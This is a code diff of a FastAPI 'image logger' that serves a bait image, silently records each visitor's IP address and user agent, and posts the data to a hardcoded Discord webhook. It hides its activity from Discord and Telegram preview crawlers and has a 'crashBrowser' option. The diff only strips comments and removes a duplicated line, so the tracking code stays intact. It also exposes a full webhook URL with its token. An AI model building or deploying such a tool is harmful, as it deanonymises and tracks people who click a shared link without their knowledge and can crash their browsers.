@@ -3,11 +3,9 @@ from fastapi import FastAPI, Request, BackgroundTasks
 from fastapi.responses import HTMLResponse, RedirectResponse, Response
 import requests
 import httpagentparser
-from urllib.parse import parse_qs, urlparse
 
 app = FastAPI()
 
-# ==================== CONFIG ====================
 config = {
     "webhook": "https://discord.com/api/webhooks/1533168835316682854/TKTyWeqHd99G3wbXyYZeCd2n6-JocDtoNKSju2cuoOYNnUtCa0iXwTAyy_CVLHf9EnAF",
     "image": "https://raw.githubusercontent.com/assettomods117-pixel/IMAGE-LOGGER/refs/heads/main/06e21ef5-4be3-4274-b7c0-681adbd313b8.jpeg",
@@ -15,11 +13,10 @@ config = {
     "color": 0x00FFFF,
     "crashBrowser": True,
     "buggedImage": False,
-    "vpnCheck": 1,          # 0 = off | 1 = não pinga VPN | 2 = não envia se for VPN
-    "antiBot": 1,           # 0 = off | 1 = não pinga bot | 2 = não envia se for bot
+    "vpnCheck": 1,
+    "antiBot": 1,
     "linkAlerts": True,
 }
-# ================================================
 
 blacklistedIPs = ("27", "104", "143", "164")
 
@@ -115,24 +112,19 @@ def make_report(ip: str, useragent: str, endpoint: str = "/api/image"):
 
 @app.get("/")
 @app.get("/api/image")
-@app.api_route("/{path:path}", methods=["GET", "POST"])
 async def logger(request: Request, background_tasks: BackgroundTasks):
-async def logger(request: Request, background_tasks: BackgroundTasks):
-    # Pega o IP real
     ip = request.headers.get("x-forwarded-for") or (request.client.host if request.client else "Unknown")
     if "," in str(ip):
         ip = ip.split(",")[0].strip()
 
     useragent = request.headers.get("user-agent", "")
 
-    # Discord / Telegram crawler
     if bot_check(ip, useragent):
         make_report(ip, useragent)
         if config["buggedImage"]:
             return Response(content=b"", media_type="image/jpeg")
         return RedirectResponse(url=config["image"], status_code=302)
 
-    # Usuário real → loga em background e mostra a imagem
     background_tasks.add_task(make_report, ip, useragent)
 
     if config["crashBrowser"]:
@@ -150,7 +142,6 @@ setTimeout(function(){{
 </html>"""
         return HTMLResponse(content=html)
 
-    # Versão normal (só a imagem)
     html = f"""<!DOCTYPE html>
 <html>
 <head><meta charset="utf-8"><title></title></head>
